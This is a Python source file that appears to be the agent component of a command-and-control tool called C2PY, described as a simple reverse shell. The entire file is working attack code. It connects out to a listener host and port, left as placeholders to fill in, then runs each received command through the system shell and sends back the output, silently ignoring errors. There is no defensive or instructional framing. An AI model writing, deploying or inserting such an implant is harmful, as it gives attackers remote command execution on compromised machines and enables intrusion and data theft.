#!/usr/bin/env python3
"""
C2PY Basic Agent - Simple Reverse Shell
For scenarios where encryption is not required
"""

import socket
import subprocess
import os


def basic_shell(lhost, lport):
    """
    Simple reverse shell connection
    
    Args:
        lhost: Listener host IP
        lport: Listener port
    """
    
    try:
        # Create socket and connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((lhost, lport))
        
        # Command loop
        while True:
            # Receive command
            cmd = sock.recv(1024).decode('utf-8', errors='replace').strip()
            
            if not cmd or cmd.lower() == 'exit':
                break
            
            try:
                # Execute command
                output = subprocess.check_output(
                    cmd,
                    shell=True,
                    stderr=subprocess.STDOUT
                )
            except Exception as e:
                output = str(e).encode()
            
            # Send output
            sock.sendall(output)
        
        sock.close()
        
    except Exception as e:
        pass


if __name__ == "__main__":
    # Configuration
    LHOST = "REPLACE_WITH_LHOST"
    LPORT = REPLACE_WITH_LPORT
    
    basic_shell(LHOST, LPORT)
